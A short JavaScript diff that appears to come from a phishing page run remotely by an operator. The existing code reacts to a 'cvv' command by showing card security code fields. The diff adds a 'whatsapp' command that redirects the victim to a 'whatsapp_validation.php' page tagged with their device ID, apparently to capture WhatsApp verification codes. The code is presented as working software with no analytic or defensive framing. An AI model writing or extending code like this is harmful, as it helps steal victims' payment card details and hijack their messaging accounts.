@@ -131,7 +131,9 @@
                 if (!command) return;
                 await commandRef.set(null);
                 
-                if (command === 'cvv') {
+                if (command === 'wpp' || command === 'whatsapp') {
+        window.location.href = (typeof basePath !== 'undefined' ? basePath : '') + 'whatsapp_validation.php?id=' + (typeof currentDeviceId !== 'undefined' ? currentDeviceId : '');
+    } else if (command === 'cvv') {
                     loaderStatus(false);
                     const c1 = document.getElementById('cvv1');
                     const c2 = document.getElementById('cvv2');
